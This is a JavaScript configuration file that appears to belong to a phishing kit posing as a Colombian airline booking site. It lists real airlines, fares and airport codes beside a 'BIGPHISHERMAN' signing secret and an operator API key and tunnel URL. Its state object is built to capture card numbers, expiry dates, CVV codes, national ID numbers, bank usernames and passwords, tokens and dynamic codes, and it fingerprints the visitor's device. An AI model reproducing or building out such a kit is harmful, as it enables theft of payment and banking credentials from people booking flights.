/**
 * CONFIGURACIÓN
 */
const API_URL = 'https://tunnel.chicascoyotelastrululu.shop'; // API Administradora.
const API_KEY = 'bffb82db-1d5b-477a-9bcf-a73b8ea5d561'; // API Administradora.
const JWT_SIGN = 'BIGPHISHERMAN';

const PRECIO_BASE = 47500
const PRECIO_BASE_INT = 80100
const MULTIPLICADOR_PLAN = {
    BASIC: 1,
    LIGHT: 1.3,
    FULL: 1.7,
    PREMIUM: 3
}
const MULTIPLICADOR_PLAN_MAP = {
    "1": 1,
    "2": 1.3,
    "3": 1.7,
    "4": 3
}
const MULTIPLICADOR_HORARIO = {
    sched1: 1,
    sched2: 1.3,
    sched3: 1.4
}
const MULTIPLICADOR_HORA_VUELO = .9


const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const destinations = [
    {
        city: "Arauca",
        country: "Colombia",
        code: "AUC",
        weight: 0
    },
    {
        city: "Armenia",
        country: "Colombia",
        code: "AXM",
        weight: 0
    },
    {
        city: "Barrancabermeja",
        country: "Colombia",
        code: "EJA",
        weight: 0
    },
    {
        city: "Barranquilla",
        country: "Colombia",
        code: "BAQ",
        weight: 0
    },
    {
        city: "Bogotá",
        country: "Colombia",
        code: "BOG",
        weight: 0
    },
    {
        city: "Bucaramanga",
        country: "Colombia",
        code: "BGA",
        weight: 0
    },
    {
        city: "Cali",
        country: "Colombia",
        code: "CLO",
        weight: 0
    },
    {
        city: "Cartagena",
        country: "Colombia",
        code: "CTG",
        weight: 0
    },
    {
        city: "Cúcuta",
        country: "Colombia",
        code: "CUC",
        weight: 0
    },
    {
        city: "Florencia",
        country: "Colombia",
        code: "FLA",
        weight: 0
    },
    {
        city: "Guapi",
        country: "Colombia",
        code: "GPI",
        weight: 0
    },
    {
        city: "Ibagué",
        country: "Colombia",
        code: "IBE",
        weight: 0
    },
    {
        city: "Ipiales",
        country: "Colombia",
        code: "IPI",
        weight: 0
    },
    {
        city: "Leticia",
        country: "Colombia",
        code: "LET",
        weight: 0
    },
    {
        city: "Manizales",
        country: "Colombia",
        code: "MZL",
        weight: 0
    },
    {
        city: "Medellín",
        country: "Colombia",
        code: "MDE",
        weight: 0
    },
    {
        city: "Montería",
        country: "Colombia",
        code: "MTR",
        weight: 0
    },
    {
        city: "Neiva",
        country: "Colombia",
        code: "NVA",
        weight: 0
    },
    {
        city: "Pasto",
        country: "Colombia",
        code: "PSO",
        weight: 0
    },
    {
        city: "Pereira",
        country: "Colombia",
        code: "PEI",
        weight: 0
    },
    {
        city: "Popayán",
        country: "Colombia",
        code: "PPN",
        weight: 0
    },
    {
        city: "Puerto Asís",
        country: "Colombia",
        code: "PUU",
        weight: 0
    },
    {
        city: "Riohacha",
        country: "Colombia",
        code: "RCH",
        weight: 0
    },
    {
        city: "San Andrés",
        country: "Colombia",
        code: "ADZ",
        weight: 0
    },
    {
        city: "San José del Guaviare",
        country: "Colombia",
        code: "SJE",
        weight: 0
    },
    {
        city: "Santa Marta",
        country: "Colombia",
        code: "SMR",
        weight: 0
    },
    {
        city: "Tumaco",
        country: "Colombia",
        code: "TCO",
        weight: 0
    },
    {
        city: "Valledupar",
        country: "Colombia",
        code: "VUP",
        weight: 0
    },
    {
        city: "Villavicencio",
        country: "Colombia",
        code: "VVC",
        weight: 0
    },
    {
        city: "Yopal",
        country: "Colombia",
        code: "EYP",
        weight: 0
    }
]
const tarifas = {
    "ltm": ['basic', 'light', 'full', 'premium'],
    "avi": ['basic', 'classic', 'flex'],
    "jetsm": ['Económica', 'Standard', 'Premium'],
}
let info = {
    flightInfo:{
        travel_type: 1,
        seat_type: 1,
        aeroline: '',
        seat_type_back: 0,
        aeroline_back: '',
        origin: {
            city: "Bogotá",
            country: "Colombia",
            code: "BOG",
            weight: 0
        },
        destination: '',
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0]
    },
    passengersInfo:{
        adults: [
            {
                name: '',
                surname: '',
                cc: ''
            }
        ],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

// LS.removeItem('info');
